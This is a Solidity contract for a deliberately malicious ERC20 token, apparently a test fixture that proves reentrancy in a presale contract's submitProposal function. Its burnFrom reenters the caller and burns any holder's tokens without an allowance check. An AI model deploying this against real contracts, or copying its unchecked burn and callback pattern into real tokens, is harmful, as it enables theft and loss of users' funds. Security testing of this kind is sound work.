// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

interface IVulnerablePresale {
    function submitProposal(bytes calldata data, uint256 depositBHT) external;
}

contract MaliciousBHT is ERC20 {
    address public attacker;
    uint256 public counter;

    constructor() ERC20("Malicious BHT", "mBHT") {
        attacker = msg.sender;
        _mint(msg.sender, 1_000_000 * 10 ** decimals());
    }

    // optional helper to set explicit target; not required for PoC
    address public target;
    function setTarget(address _target) external {
        require(msg.sender == attacker, "only attacker");
        target = _target;
    }

    // Allow tests to mint tokens to addresses
    function mint(address to, uint256 amount) external {
        require(msg.sender == attacker, "only attacker");
        _mint(to, amount);
    }

    // burnFrom will attempt to reenter the presale by calling submitProposal on a configured target
    function burnFrom(address account, uint256 amount) external {
        // emulate a burn by transferring from account to address(0) if allowance/balance present
        // but purposefully call back into the target to attempt reentrancy
        counter += 1;
        if (counter == 1) {
            address tryTarget = target;
            if (tryTarget == address(0)) {
                // fall back to caller (the presale contract) so the token can reenter
                tryTarget = msg.sender;
            }
            // make a minimal reentrant call; data can be empty
            try IVulnerablePresale(tryTarget).submitProposal("", 1) {
                // ignore
            } catch {
                // ignore failures so tests can proceed
            }
        }
        // perform an actual burn (reduce balance)
        _burn(account, amount);
    }
}
